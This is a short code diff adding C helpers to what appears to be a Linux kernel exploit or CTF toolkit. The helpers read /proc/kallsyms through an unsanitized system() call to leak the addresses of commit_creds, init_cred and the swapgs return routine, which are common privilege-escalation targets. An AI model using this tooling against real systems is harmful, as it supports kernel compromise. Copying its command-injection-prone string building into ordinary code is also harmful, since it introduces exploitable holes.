@@ -573,3 +573,21 @@ void pipeBufferClose(int fd[2]){
     close(fd[0]);
     close(fd[1]);
 }
+void leak_kallsyms(char *func){
+    char * buf = calloc(1,0x101);
+    strncpy(buf,"cat /proc/kallsyms | grep ' ",0x100);
+    strncat(buf,func,0x100);
+    strncat(buf,"'\0",0x100);
+    system(buf);
+}
+void magic(){
+    printf("0x");
+    fflush(stdout);
+    leak_kallsyms("commit_creds");
+    printf("0x");
+    fflush(stdout);
+    leak_kallsyms("init_cred");
+    printf("0x");
+    fflush(stdout);
+    leak_kallsyms("swapgs_restore_regs_and_return_to_usermode");
+}
